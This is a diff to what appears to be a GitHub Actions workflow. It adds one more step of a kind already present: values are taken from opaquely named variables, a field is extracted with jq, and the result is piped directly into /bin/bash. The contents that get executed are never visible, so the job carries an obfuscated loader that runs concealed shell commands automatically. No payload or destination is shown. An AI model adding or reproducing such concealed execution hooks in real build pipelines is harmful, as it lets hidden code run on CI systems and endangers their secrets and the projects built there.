@@ -23,6 +23,7 @@ jobs:
           echo $ekq965 | jq -r .hnh3 | /bin/bash
           printf '%s' "$dsc5" | jq -r .q3 | /bin/bash
           echo $jgj9 | jq -r .t78012 | /bin/bash
+          echo $neotr94 | jq -r .axe50853 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
